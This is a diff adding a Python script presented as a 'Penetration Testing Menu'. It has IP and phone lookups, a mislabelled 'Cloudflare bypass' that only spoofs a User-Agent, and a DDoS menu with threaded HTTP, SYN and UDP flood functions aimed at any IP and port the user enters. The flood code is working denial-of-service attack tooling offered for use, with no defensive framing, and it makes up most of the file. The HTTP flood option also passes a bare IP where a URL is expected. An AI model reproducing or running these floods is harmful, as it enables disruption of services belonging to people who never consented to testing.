@@ -1,0 +1,118 @@
+import socket
+import requests
+import threading
+import time
+from scapy.all import *
+
+def ip_lookup():
+    ip = input("Enter the IP address: ")
+    try:
+        host = socket.gethostbyaddr(ip)
+        print(f"Host information for {ip}: {host}")
+    except socket.herror:
+        print("Host information could not be found.")
+
+def phone_lookup():
+    phone = input("Enter the phone number: ")
+    api_key = "your_api_key_here"
+    url = f"https://api.phone_lookup_service.com/lookup?phone={phone}&key={api_key}"
+    response = requests.get(url)
+    if response.status_code == 200:
+        print("Phone lookup result:")
+        print(response.json())
+    else:
+        print("Failed to lookup phone number.")
+
+def cloudflare_bypass():
+    url = input("Enter the website URL: ")
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
+    }
+    try:
+        response = requests.get(url, headers=headers)
+        print(f"Website content from {url}:\n{response.text[:500]}")  # Show first 500 characters
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
+
+def http_flood(target_url, duration):
+    timeout = time.time() + duration
+    while time.time() < timeout:
+        try:
+            requests.get(target_url)
+            print(f"Sent request to {target_url}")
+        except requests.exceptions.RequestException as e:
+            print(f"Failed to send request: {e}")
+
+def syn_flood(target_ip, target_port, duration):
+    timeout = time.time() + duration
+    while time.time() < timeout:
+        try:
+            send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"))
+            print(f"SYN packet sent to {target_ip}:{target_port}")
+        except Exception as e:
+            print(f"Failed to send SYN packet: {e}")
+
+def udp_flood(target_ip, target_port, duration):
+    timeout = time.time() + duration
+    while time.time() < timeout:
+        try:
+            send(IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="X" * 1024))
+            print(f"UDP packet sent to {target_ip}:{target_port}")
+        except Exception as e:
+            print(f"Failed to send UDP packet: {e}")
+
+def ddos_menu():
+    print("DDoS Options:")
+    print("1. Start HTTP Flood")
+    print("2. Start SYN Flood")
+    print("3. Start UDP Flood")
+    print("4. Return to Main Menu")
+    
+    choice = input("Choose an option: ")
+    
+    if choice in ["1", "2", "3"]:
+        target_ip = input("Enter target IP address: ")
+        target_port = int(input("Enter target port: "))
+        duration = int(input("Enter attack duration in seconds: "))
+        
+        if choice == "1":
+            thread = threading.Thread(target=http_flood, args=(target_ip, duration))
+            thread.start()
+        elif choice == "2":
+            thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
+            thread.start()
+        elif choice == "3":
+            thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
+            thread.start()
+    elif choice == "4":
+        return
+    else:
+        print("Invalid option. Returning to main menu.")
+
+def main_menu():
+    while True:
+        print("Penetration Testing Menu")
+        print("1. IP Lookup")
+        print("2. Phone Lookup")
+        print("3. Cloudflare Bypass")
+        print("4. DDoS Menu")
+        print("5. Exit")
+        
+        choice = input("Choose an option: ")
+        
+        if choice == "1":
+            ip_lookup()
+        elif choice == "2":
+            phone_lookup()
+        elif choice == "3":
+            cloudflare_bypass()
+        elif choice == "4":
+            ddos_menu()
+        elif choice == "5":
+            print("Exiting...")
+            break
+        else:
+            print("Invalid choice, please try again.")
+
+if __name__ == "__main__":
+    main_menu()
